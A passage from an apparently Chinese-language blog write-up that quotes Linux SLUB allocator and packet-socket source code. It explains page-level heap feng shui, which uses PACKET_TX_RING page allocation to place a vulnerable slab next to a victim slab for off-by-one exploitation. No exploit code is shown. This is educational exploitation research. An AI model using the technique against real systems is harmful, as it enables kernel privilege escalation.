fract_leftover)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> min_order = slub_min_order;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> order;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (order_objects(min_order, size) &gt; MAX_OBJS_PER_PAGE)</span><br><span class="line"><span class="keyword">return</span> get_order(size * MAX_OBJS_PER_PAGE) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (order = max(min_order, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)get_order(min_objects * size));</span><br><span class="line">order &lt;= max_order; order++) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> slab_size = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)PAGE_SIZE &lt;&lt; order;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> rem;</span><br><span class="line"></span><br><span class="line">rem = slab_size % size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (rem &lt;= slab_size / fract_leftover)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> order;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数就是最终计算出<code>order</code>的函数了，可以看到这里会从slab所需要的最小order到最大order之间开始遍历，查找能够使slab碎片最小的order值。而rem则是slab的碎片大小：分配完object之后，所产生的碎片大小。碎片大小rem不能超过<code>slab_size / fract_leftover</code>即符合要求。</p><p>这里的<code>get_order</code>函数也较为简单，<del>这狗屎玩意，开始看错了文件导致一直看不懂，硬生生看了两个小时才反应过来了</del>。也就是根据size返回对应的最小的<code>order</code>，所以这里的如果根据上一个函数中的<code>min_object</code>的值为<code>0x10</code>来看的话，最终返回的<code>order</code>也就是3。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">order_objects</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> order, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)PAGE_SIZE &lt;&lt; order) / size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct kmem_cache_order_objects <span class="title">oo_make</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> order,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">x</span> =</span> &#123;</span><br><span class="line">(order &lt;&lt; OO_SHIFT) + order_objects(order, size)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后由<code>oo_make</code>函数写入到oo成员中去了。</p><h3 id="kmem-cache-alloc流程"><a href="#kmem-cache-alloc流程" class="headerlink" title="kmem_cache_alloc流程"></a>kmem_cache_alloc流程</h3><p>可以看到前面<code>kmem_cache_create_usercopy</code>函数只是对<code>kmem_cache</code>结构体里面的成员进行初始化赋值，并没有实质性的生成slab。而真正分配slab是在第一次对这个cache申请object的时候，也就是这个小标题的函数。</p><p>这里的调用流程就是：<code>kmem_cache_alloc</code>=&gt;<code>__kmem_cache_alloc_lru</code>=&gt;<code>slab_alloc</code>=&gt;<code>slab_alloc_node</code>=&gt;<code>__slab_alloc_node</code>=&gt;<code>new_slab</code>=&gt;<code>allocate_slab</code>=&gt;<code>alloc_slab_page</code></p><h4 id="slab-alloc-node函数"><a href="#slab-alloc-node函数" class="headerlink" title="__slab_alloc_node函数"></a>__slab_alloc_node函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *__slab_alloc_node(struct kmem_cache *s,</span><br><span class="line"><span class="keyword">gfp_t</span> gfpflags, <span class="keyword">int</span> node, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">size_t</span> orig_size)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">partial_context</span> <span class="title">pc</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line"><span class="keyword">void</span> *object;</span><br><span class="line"></span><br><span class="line">pc.flags = gfpflags;</span><br><span class="line">pc.slab = &amp;slab;</span><br><span class="line">pc.orig_size = orig_size;</span><br><span class="line">object = get_partial(s, node, &amp;pc);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (object)</span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line"></span><br><span class="line">slab = new_slab(s, gfpflags, node);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!slab)) &#123;</span><br><span class="line">slab_out_of_memory(s, gfpflags, node);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">object = alloc_single_from_new_slab(s, slab, orig_size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到分配顺序就是首先访问<code>partial</code>指针中，如果其中没有可以返回的object就会执行到<code>new_slab</code>函数分配新的slab。</p><h4 id="alloc-single-from-new-slab函数"><a href="#alloc-single-from-new-slab函数" class="headerlink" title="alloc_single_from_new_slab函数"></a>alloc_single_from_new_slab函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">alloc_single_from_new_slab</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function">struct slab *slab, <span class="keyword">int</span> orig_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> nid = slab_nid(slab);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">n</span> =</span> get_node(s, nid);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"><span class="keyword">void</span> *object;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">object = slab-&gt;freelist;</span><br><span class="line">slab-&gt;freelist = get_freepointer(s, object);</span><br><span class="line">slab-&gt;inuse = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!alloc_debug_processing(s, slab, object, orig_size))</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * It&#x27;s not really expected that this would fail on a</span></span><br><span class="line"><span class="comment"> * freshly allocated slab, but a concurrent memory</span></span><br><span class="line"><span class="comment"> * corruption in theory could cause that.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">spin_lock_irqsave(&amp;n-&gt;list_lock, flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (slab-&gt;inuse == slab-&gt;objects)</span><br><span class="line">add_full(s, n, slab);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">add_partial(n, slab, DEACTIVATE_TO_HEAD);</span><br><span class="line"></span><br><span class="line">inc_slabs_node(s, nid, slab-&gt;objects);</span><br><span class="line">spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里主要做的事就是首先取下<code>freelist</code>指向的object，随后将slab添加到<code>partial</code>指针处。</p><h4 id="allocate-slab函数"><a href="#allocate-slab函数" class="headerlink" title="allocate_slab函数"></a>allocate_slab函数</h4><p>上面提到了<code>new_slab</code>函数，其实实质上调用的是这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct slab *<span class="title">allocate_slab</span><span class="params">(struct kmem_cache *s, <span class="keyword">gfp_t</span> flags, <span class="keyword">int</span> node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span> =</span> s-&gt;oo;</span><br><span class="line"><span class="keyword">gfp_t</span> alloc_gfp;</span><br><span class="line"><span class="keyword">void</span> *start, *p, *next;</span><br><span class="line"><span class="keyword">int</span> idx;</span><br><span class="line"><span class="keyword">bool</span> shuffle;</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line">slab = alloc_slab_page(alloc_gfp, node, oo);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!slab)) &#123;</span><br><span class="line">oo = s-&gt;min;</span><br><span class="line">alloc_gfp = flags;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Allocation may have failed due to fragmentation.</span></span><br><span class="line"><span class="comment"> * Try a lower order alloc if possible</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">slab = alloc_slab_page(alloc_gfp, node, oo);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!slab))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">stat(s, ORDER_FALLBACK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">slab-&gt;objects = oo_objects(oo);</span><br><span class="line">slab-&gt;inuse = <span class="number">0</span>;</span><br><span class="line">slab-&gt;frozen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">account_slab(slab, oo_order(oo), s, flags);</span><br><span class="line"></span><br><span class="line">slab-&gt;slab_cache = s;</span><br><span class="line"></span><br><span class="line">kasan_poison_slab(slab);</span><br><span class="line"></span><br><span class="line">start = slab_address(slab);</span><br><span class="line"></span><br><span class="line">setup_slab_debug(s, slab, start);</span><br><span class="line"></span><br><span class="line">shuffle = shuffle_freelist(s, slab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!shuffle) &#123;</span><br><span class="line">start = fixup_red_left(s, start);</span><br><span class="line">start = setup_object(s, start);</span><br><span class="line">slab-&gt;freelist = start;</span><br><span class="line"><span class="keyword">for</span> (idx = <span class="number">0</span>, p = start; idx &lt; slab-&gt;objects - <span class="number">1</span>; idx++) &#123;</span><br><span class="line">next = p + s-&gt;size;</span><br><span class="line">next = setup_object(s, next);</span><br><span class="line">set_freepointer(s, p, next);</span><br><span class="line">p = next;</span><br><span class="line">&#125;</span><br><span class="line">set_freepointer(s, p, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> slab;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对于新分配的slab首先写的就是他的<code>freelist</code>指针，所以根据上面外层函数的调用顺序来看，在刚挂载到<code>freelist</code>紧接着就会返回object并重新挂载到<code>partial</code>上。</p><p>也可以看到这个函数中调用了在slab分配分析开头给出的函数<code>alloc_slab_page</code>。</p><h2 id="页级堆风水构造"><a href="#页级堆风水构造" class="headerlink" title="页级堆风水构造"></a>页级堆风水构造</h2><p>终于要说到跟题目有关系的内容了。</p><p>如果提到一个驱动存在<code>off by null</code>或者<code>off by one</code>漏洞时，我的第一反应就是这个<a href="https://cv196082.gitee.io/2022/09/20/CVE-2021-22555%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90/">CVE-2021-22555</a>中的办法，使用大量堆喷来完成。但是如果题目的slab是由<code>kmem_cache_create_usercopy</code>创建的话困难就会存在很大的问题了，如果你当前使用堆喷的堆块的order与创建的cache不一致，这样只有极低的概率可以让驱动生成的slab紧邻堆喷的slab。所以为了提高脚本的稳定性，出现了这一利用手法。</p><p>其实这一手法以前在安全客中有看到但是当时并没有在意，所以现在借着墨晚鸢佬的博客学习一下。页级堆风水即以内存页为粒度的内存排布方式，而内核内存页的排布对我们来说不仅未知且信息量巨大，因此这种利用手法实际上是让我们手工构造一个新的已知的页级粒度内存页排布。</p><p>在上述解释完slab的分配过程想必应该都能理解<code>buddy system</code>了，他的基本原理就是以 2 的 order 次幂张内存页作为分配粒度，相同 order 间空闲页面构成双向链表，当低阶 order 的页面不够用时便会从高阶 order 取一份连续内存页拆成两半，其中一半挂回当前请求 order 链表，另一半返还给上层调用者；下图为以 order 2 为例的 buddy system 页面分配基本原理（偷的图）：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/79biltjNfACIZcP.gif"                      alt="偷"                ></p><p>不难想到这个利用方式的原理就是：从更高阶 order 拆分成的两份低阶 order 的连续内存页是物理连续的，由此我们可以：</p><ul><li>  向 buddy system 请求两份连续的内存页</li><li>  释放其中一份内存页，分配 <code>vulnerable kmem_cache</code> ，让其取走这份内存页</li><li>  释放另一份内存页，使用 <code>victim kmem_cache</code> 堆喷，让其取走这份内存页</li></ul><p>那么此时我们可以使用<code>vulnerable kmem_cache</code>的<code>off by null</code>或<code>off by one</code>去修改到<code>victim kmem_cache</code>了。</p><h3 id="分配任意数量任意大小page"><a href="#分配任意数量任意大小page" class="headerlink" title="分配任意数量任意大小page"></a>分配任意数量任意大小page</h3><p>根据上述内容来看，我们需要消耗掉小<code>order</code>的页面才能继续进行，这也就意味着我们需要一个可以申请指定<code>order</code>的API。这里选择是<a class="link"   href="https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html" >CVE-2017-7308<i class="fas fa-external-link-alt"></i></a>中的方法。</p><p>当我们创建一个 <code>protocol</code> 为 <code>PF_PACKET</code> 的 socket 之后，先调用 <code>setsockopt()</code> 将 <code>PACKET_VERSION</code> 设为 <code>TPACKET_V1 </code>/ <code>TPACKET_V2</code>，再调用 <code>setsockopt()</code> 提交一个 <code>PACKET_TX_RING</code> ，此时便存在如下调用链：</p><p><code>__sys_setsockopt</code>=&gt;<code>sock-&gt;ops-&gt;setsockopt</code>=&gt;<code>packet_setsockopt</code>=&gt;<code>packet_set_ring</code>=&gt;<code>alloc_pg_vec</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct pgv *<span class="title">alloc_pg_vec</span><span class="params">(struct tpacket_req *req, <span class="keyword">int</span> order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> block_nr = req-&gt;tp_block_nr;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span>;</span></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">pg_vec = kcalloc(block_nr, <span class="keyword">sizeof</span>(struct pgv), GFP_KERNEL | __GFP_NOWARN);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!pg_vec))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; block_nr; i++) &#123;</span><br><span class="line">pg_vec[i].buffer = alloc_one_pg_vec_page(order);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!pg_vec[i].buffer))</span><br><span class="line"><span class="keyword">goto</span> out_free_pgvec;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> pg_vec;</span><br><span class="line"></span><br><span class="line">out_free_pgvec:</span><br><span class="line">free_pg_vec(pg_vec, order, block_nr);</span><br><span class="line">pg_vec = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到的是这里<code>alloc_pg_vec</code>函数通过<code>alloc_one_pg_vec_page</code>函数申请buffer。并且这里申请的数量为<code>req-&gt;tp_block_nr</code>而req是用户可控的，所以这里申请的数量是可控的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> *<span class="title">alloc_one_pg_vec_page</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *buffer;</span><br><span class="line"><span class="keyword">gfp_t</span> gfp_flags = GFP_KERNEL | __GFP_COMP |</span><br><span class="line">  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;</span><br><span class="line"></span><br><span class="line">buffer = (<span class="keyword">char</span> *) __get_free_pages(gfp_flags, order);</span><br><span class="line"><span class="keyword">if</span> (buffer)</span><br><span class="line"><span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* __get_free_pages failed, fall back to vmalloc */</span></span><br><span class="line">buffer = vzalloc(array_size((<span class="number">1</span> &lt;&lt; order), PAGE_SIZE));</span><br><span class="line"><span class="keyword">if</span> (buffer)</span><br><span class="line"><span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* vmalloc failed, lets dig into swap here */</span></span><br><span class="line">gfp_flags &amp;= ~__GFP_NORETRY;</span><br><span class="line">buffer = (<span class="keyword">char</span> *) __get_free_pages(gfp_flags, order);</span><br><span class="line"><span class="keyword">if</span> (buffer)</span><br><span class="line"><span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* complete and utter failure */</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而<code>alloc_one_pg_vec_page</code>函数使用<code>__get_free_pages</code>申请到page。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">packet_setsockopt(struct socket *sock, <span class="keyword">int</span> level, <span class="keyword">int</span> optname, <span class="keyword">sockptr_t</span> optval,</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> optlen)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span> =</span> pkt_sk(sk);</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (level != SOL_PACKET)</span><br><span class="line"><span class="keyword">return</span> -ENOPROTOOPT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (optname) &#123;</span><br><span class="line"><span class="keyword">case</span> PACKET_ADD_MEMBERSHIP:</span><br><span class="line"><span class="keyword">case</span> PACKET_DROP_MEMBERSHIP:</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_mreq_max</span> <span class="title">mreq</span>;</span></span><br><span class="line"><span class="keyword">int</span> len = optlen;</span><br><span class="line"><span class="built_in">memset</span>(&amp;mreq, <span class="number">0</span>, <span class="keyword">sizeof</span>(mreq));</span><br><span class="line"><span class="keyword">if</span> (len &lt; <span class="keyword">sizeof</span>(struct packet_mreq))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (len &gt; <span class="keyword">sizeof</span>(mreq))</span><br><span class="line">len = <span class="keyword">sizeof</span>(mreq);</span><br><span class="line"><span class="keyword">if</span> (copy_from_sockptr(&amp;mreq, optval, len))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (len &lt; (mreq.mr_alen + offsetof(struct packet_mreq, mr_address)))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (optname == PACKET_ADD_MEMBERSHIP)</span><br><span class="line">ret = packet_mc_add(sk, &amp;mreq);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ret = packet_mc_drop(sk, &amp;mreq);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> PACKET_RX_RING:</span><br><span class="line"><span class="keyword">case</span> PACKET_TX_RING:</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">tpacket_req_u</span> <span class="title">req_u</span>;</span></span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line">lock_sock(sk);</span><br><span class="line"><span class="keyword">switch</span> (po-&gt;tp_version) &#123;</span><br><span class="line"><span class="keyword">case</span> TPACKET_V1:</span><br><span class="line"><span class="keyword">case</span> TPACKET_V2:</span><br><span class="line">len = <span class="keyword">sizeof</span>(req_u.req);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> TPACKET_V3:</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">len = <span class="keyword">sizeof</span>(req_u.req3);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (optlen &lt; len) &#123;</span><br><span class="line">ret = -EINVAL;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (copy_from_sockptr(&amp;req_u.req, optval, len))</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ret = packet_set_ring(sk, &amp;req_u, <span class="number">0</span>,</span><br><span class="line">    optname == PACKET_TX_RING);</span><br><span class="line">&#125;</span><br><span class="line">release_sock(sk);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">      ... ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到当我们的<code>optname</code>为<code>PACKET_TX_RING</code>时会调用到<code>packet_set_ring</code>，因为此时len的关系，我们还需要设置<code>po-&gt;tp_version</code>为<code>TPACKET_V1</code>/<code>TPACKET_V2</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> PACKET_VERSION:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> val;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (optlen != <span class="keyword">sizeof</span>(val))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (copy_from_sockptr(&amp;val, optval, <span class="keyword">sizeof</span>(val)))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="keyword">switch</span> (val) &#123;</span><br><span class="line"><span class="keyword">case</span> TPACKET_V1:</span><br><span class="line"><span class="keyword">case</span> TPACKET_V2:</span><br><span class="line"><span class="keyword">case</span> TPACKET_V3:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line">lock_sock(sk);</span><br><span class="line"><span class="keyword">if</span> (po-&gt;rx_ring.pg_vec || po-&gt;tx_ring.pg_vec) &#123;</span><br><span class="line">ret = -EBUSY;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">po-&gt;tp_version = val;</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span 